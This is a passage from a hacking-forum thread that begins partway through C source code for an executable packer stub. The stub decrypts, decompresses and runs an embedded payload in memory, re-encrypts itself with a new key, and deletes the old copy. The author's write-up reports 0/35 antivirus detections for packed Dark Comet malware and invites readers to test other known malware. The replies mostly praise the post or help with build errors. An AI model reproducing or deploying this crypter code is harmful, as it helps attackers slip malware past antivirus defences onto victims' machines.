        Debug("Memory call entry point error: %d\n", nSuccess);
    }

    MemoryFreeLibrary(hModule);
}
*/

VOID SelfDelete(LPCSTR szFileName) {
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    //CreateFile("old.exe", 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
    CHAR szCmdLine[MAX_PATH];
    sprintf(szCmdLine, "%s delete", szFileName);
    if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi) == FALSE) {
        Debug("Create process error: %lu\n", GetLastError());
    }
}

BOOL PolymorphPayload(LPCSTR szFileName) {
    MoveFile(szFileName, "old.exe");
    CopyFile("old.exe", szFileName, FALSE);

    // re-extract resources
    FileStruct *fs = ExtractPayload();
    if (fs == NULL) return FALSE;

    // decrypt buffer
    if (DecryptPayload(fs) == FALSE) {
        Debug("DecryptPayload buffer error: %lu\n", GetLastError());
        free(fs);
        return FALSE;
    }

    // generate new key
    if (GenerateKey(fs) == FALSE) {
        Debug("Generate key error: %lu\n", GetLastError());
        free(fs);
        return FALSE;
    }

    // encrypt with new key
    if (Encrypt(fs) == FALSE) {
        Debug("Encrypt buffer error: %lu\n", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    }

    // update resources
    if (UpdateResources(fs, szFileName) == FALSE) {
        free(fs-&gt;pKey);
        free(fs);
        return FALSE;
    }

    SelfDelete(szFileName);

    free(fs-&gt;pKey);
    free(fs);

    return TRUE;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    if (strstr(GetCommandLine(), "delete") != NULL) {
        while (DeleteFile("old.exe") == FALSE);
    } else {
        FileStruct *fs = ExtractPayload();
        if (fs == NULL) {
            Debug("Extract file error: %lu\n", GetLastError());
            return 1;
        }

        if (DecryptPayload(fs) == TRUE) {
            if (DecompressPayload(fs) == TRUE)
                //DropAndExecutePayload(fs, "test.exe");
                MemoryExecutePayload(fs);
        }
        free(fs-&gt;pBuffer);
        free(fs);

        CHAR szFileName[MAX_PATH];
        GetModuleFileName(NULL, szFileName, MAX_PATH);
        PolymorphPayload(szFileName);
    }

    return 0;
}
</code></pre>
<p>The stub simply performs the reversal of the packer. After extracting the necessary information from the resources into the struct, it first deobfuscates the payload by decrypting and then decompressing the buffer with <code>DecryptPayload</code> and <code>DecompressPayload</code>. After a successful deobfuscation, the stub will simply drop the executable in the same directory and execute it. Of course, using the RunPE/Dynamic Forking method would eliminate any disk activity and the resulting forensics.</p>
<hr>
<h2>Resources and the PE File Format</h2>
<p>Here is a quick file analysis showing the resources within a file.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/200e9f8077ca5789342793e5e1d3145e6a2c1321.PNG" width="690" height="335"></p>
<p>The arrow shows the section for resources (.rsrc) and within the section is simply the resource which has been added to the binary. The labels in the red box on the left represent the different resources which exist in the PE file. Currently, PEView shows the <code>RCDATA</code> (raw data) for resource ID <code>000A</code> which, as seen from the code above, is the obfuscated payload.</p>
<p>Here is the 32-byte key for the XOR cipher.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/d01749ce5235e32239e0b3c00872d3549ccc4157.PNG" width="690" height="379"></p>
<hr>
<h2>Demonstration</h2>
<p>Here is a quick demonstration using putty.exe as the payload.</p>
<p>Firstly, launching the packer to create the stub and to add an obfuscated payload.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/fe5927977bd9b70bf2e44a0cf2085332fb01f12c.PNG" width="690" height="204"></p>
<p>Off-screen, the size of putty.exe is ~512 KB while the stub is ~318 KB. Now, we can launch the generated stub.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/82f46341862a88074bbd517f99c75c763033c038.PNG" width="690" height="306"><br>
As we can see, it dropped the deobfuscated payload <code>test.exe</code> and then executed it.</p>
<hr>
<h2>Update August 1, 2016</h2>
<h3>Added feature to execute packed payload directly from memory.</h3>
<p>I’ve just added the RunPE method to my packer and it works perfectly (when compiled with MinGW). Here are some (non-distributing) virus scans with Dark Comet.<br>
<a href="https://scan.majyx.net/scans/result/37b1f15e43db4921cbf1ef1d3d149f58568e76d1">Majyx</a> (0/35)<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/a427fbc00c08df53efc73598c1aa2e61a8b21220.png" width="500" height="500"><br>
<a href="http://nodistribute.com/result/b7yt9BLzH8Ge4RIK6unM">NoDistribute</a> (0/35)<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/fc03646dcb5133123ea3414b5d342cebfe50a9f2.png" width="373" height="500"><br>
Please feel free to test other known malware with these two (or any other <strong>NON</strong> distributing virus scanning websites).</p>
<h3>Added feature to polymorph packed payload</h3>
<p>Basically just re-encrypts the compressed payload with a new key.</p>
<hr>
<h2>Conclusion</h2>
<p>The only difficult aspect in this is understanding the resource management but other than that, it’s a pretty simple concept. I’ve added the necessary files to my <a href="https://github.com/93aef0ce4dd141ece6f5/Packer">GitHub</a> including a compiled 32-bit binary.</p>
<p>Thank you for reading.</p>
<p><em>– dtm</em></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="20" />
<span class="post-likes">20 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-07-29T16:09:50Z" class="post-time">
July 29, 2016, 4:09pm
</time>
<meta itemprop="dateModified" content="2016-07-29T16:09:50Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Great post as usual mate! <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-01T12:21:02Z" class="post-time">
August 1, 2016, 12:21pm
</time>
<meta itemprop="dateModified" content="2016-08-01T12:21:02Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Bump. Updated information.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/root_haxor"><span itemprop="name">root_haxor</span></a>
(RooT HaXor)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-01T13:55:16Z" class="post-time">
August 1, 2016, 1:55pm
</time>
<meta itemprop="dateModified" content="2016-08-01T13:55:16Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Great POST brother will learn it you explained it well</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-01T16:08:11Z" class="post-time">
August 1, 2016, 4:08pm
</time>
<meta itemprop="dateModified" content="2016-08-01T16:08:11Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You did it!. Very nice solution!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Wbdn"><span itemprop="name">Wbdn</span></a>
(Wbdn)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/1X/8feaf630847b4c2c437182bb04278a8e849f42e5.PNG">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-14T20:12:42Z" class="post-time">
August 14, 2016, 8:12pm
</time>
<meta itemprop="dateModified" content="2016-08-14T20:41:53Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Nice tut, thank you!<br>
1st i’ve built packer stub</p>
<details>
<summary>
Screenshot</summary>
<p><a href="http://imgur.com/a/PcjTI" rel="noopener nofollow ugc">link</a></p>
</details>
<p>next i’ve build packer with stub in same dir [details=Screen]<a href="http://i.imgur.com/Cfgxzln.png" rel="noopener nofollow ugc">link</a> [/details]</p>
<p>next i’m trying to pack exe<br>
but i got [details=error]<img src="https://0x00sec.s3.amazonaws.com/original/1X/8feaf630847b4c2c437182bb04278a8e849f42e5.PNG" width="690" height="389">[/details]</p>
<p>When i compile with VS i have virtualAlloc error 6, with mingw i cant link zlib lib</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/1X/118528c7de07bba7ef5c4fca439f8a58a10927d3.PNG">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-14T23:53:15Z" class="post-time">
August 14, 2016, 11:53pm
</time>
<meta itemprop="dateModified" content="2016-08-14T23:53:15Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi there.</p>
<aside class="quote no-group" data-username="Wbdn" data-post="6" data-topic="847">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../letter_avatar_proxy/v4/letter/w/e0b2c6/40.png" class="avatar"> Wbdn:</div>
<blockquote>
<p>When i compile with VS i have virtualAlloc error 6</p>
</blockquote>
</aside>
<p>I’m assuming you’re using the RunPE method to execute the payload since it’s default but I did mention that compiling with MSVS would return errors.</p>
<aside class="quote no-group" data-username="Wbdn" data-post="6" data-topic="847">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../letter_avatar_proxy/v4/letter/w/e0b2c6/40.png" class="avatar"> Wbdn:</div>
<blockquote>
<p>with mingw i cant link zlib lib</p>
</blockquote>
</aside>
<p>With zLib, I see you’ve used <code>zlibstat.lib</code> which (I believe) isn’t the latest version. You’ll need to navigate the the <a href="http://www.zlib.net/">zLib Home Page</a> and download it from one of these mirrors from this section of the page:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/118528c7de07bba7ef5c4fca439f8a58a10927d3.PNG" width="690" height="428"><br>
It should come with a <code>zdll.lib</code> with which you should link.</p>
<p>Also, please make sure that you include the resource file <code>rsrc.rc</code> into the compilation phase otherwise <code>Packer.exe</code> will not receive the <code>PackerStub.exe</code> resource.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Wbdn"><span itemprop="name">Wbdn</span></a>
(Wbdn)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-15T09:15:58Z" class="post-time">
August 15, 2016, 9:15am
</time>
<meta itemprop="dateModified" content="2016-08-15T09:15:58Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>thanks for answer! i’ve compiled packerstub with mingw, how can i include resource file into compilation phase?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-15T09:24:38Z" class="post-time">
August 15, 2016, 9:24am
</time>
<meta itemprop="dateModified" content="2016-08-15T09:24:38Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a href="http://www.mingw.org/wiki/MS_resource_compiler">MinGW - MS Resource Compiler</a></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Wbdn"><span itemprop="name">Wbdn</span></a>
(Wbdn)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-15T14:45:14Z" class="post-time">
August 15, 2016, 2:45pm
</time>
<meta itemprop="dateModified" content="2016-08-15T16:26:51Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>big thanks for help, but now i got virtualAlloc error 487 and next end update resource error 5(win 10 x64 pro))<br>
also, there is any way to link zlib1 statically?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-08-28T06:29:43Z" class="post-time">
August 28, 2016, 6:29am
</time>
<meta itemprop="dateModified" content="2016-08-28T06:29:43Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>There’s a download to the source files. Inside, you can manually compile the zlibstat with MSVC++.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Mino"><span itemprop="name">Mino</span></a>
(Mino)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-06T20:01:35Z" class="post-time">
December 6, 2017, 8:01pm
</time>
<meta itemprop="dateModified" content="2017-12-06T20:01:35Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>one small question if this putty generated it’s loaded in memory it will crash?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Sk0xic"><span itemprop="name">Sk0xic</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-07T01:36:38Z" class="post-time">
December 7, 2017, 1:36am
</time>
<meta itemprop="dateModified" content="2017-12-07T01:36:38Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p><strong><em>Awesome like always <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a></em></strong></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-07T02:01:31Z" class="post-time">
December 7, 2017, 2:01am
</time>
<meta itemprop="dateModified" content="2017-12-07T02:01:31Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Sorry, I don’t quite understand what you’re trying to ask. To which stage are you referring? the packing or the RunPE execution?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/friend_friend"><span itemprop="name">friend_friend</span></a>
(Friend Friend)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-07T20:52:33Z" class="post-time">
December 7, 2017, 8:52pm
</time>
<meta itemprop="dateModified" content="2017-12-07T20:52:33Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>i mean the stub combined with payload could be loaded in memory? and at last your stub is dropping the file in disk that’s i think is not good idea. but it’s only my opinion not sure. i was refering to runpe will work with the packed file?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-07T22:53:48Z" class="post-time">
December 7, 2017, 10:53pm
</time>
<meta itemprop="dateModified" content="2017-12-07T22:53:48Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You don’t need to touch the disk if you use RunPE. And yes, RunPE should work for the packed file.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_19" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/friend_friend"><span itemprop="name">friend_friend</span></a>
(Friend Friend)
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-08T11:49:50Z" class="post-time">
December 8, 2017, 11:49am
</time>
<meta itemprop="dateModified" content="2017-12-08T11:49:50Z">
<span itemprop="position">19</span>
</span>
</div>
<div class="post" itemprop="text">
<p>yeah but my question is you are dropping the payload unencrypted on the disk . at last will be the same file in disk and this is not a good idea is just my opinion maybe i’m wrong. but using runpe not drop the disk and why? i dont understand in the function you drop the payload so why change the behaviour of your stub just using runpe? i dont understand this well.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-08T21:47:50Z" class="post-time">
December 8, 2017, 9:47pm
</time>
<meta itemprop="dateModified" content="2017-12-08T21:47:50Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You <em>can</em> write it to disk as an option but as I said, you don’t need to because you can use RunPE to load the payload directly into memory for execution. They’re both different functions that do different things.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_21" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
Closed
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-11T18:00:07Z" class="post-time">
December 11, 2017, 6:00pm
</time>
<meta itemprop="dateModified" content="2017-12-11T18:00:07Z">
<span itemprop="position">21</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 4 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_22" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
Opened
</span>
<link itemprop="mainEntityOfPage" href="847.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-12-22T00:41:57Z" class="post-time">
December 22, 2017, 12:41am
</time>
<meta itemprop="dateModified" content="2017-12-22T00:41:57Z">
<span itemprop="position">22</span>
</span>
</div>
<div class="post" itemprop="text">
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
<div role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement" class="topic-body crawler-post">
<span itemprop="name"><b><a rel="next" itemprop="url" href="847%3Fpage=2.html">next page →</a></b></span>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
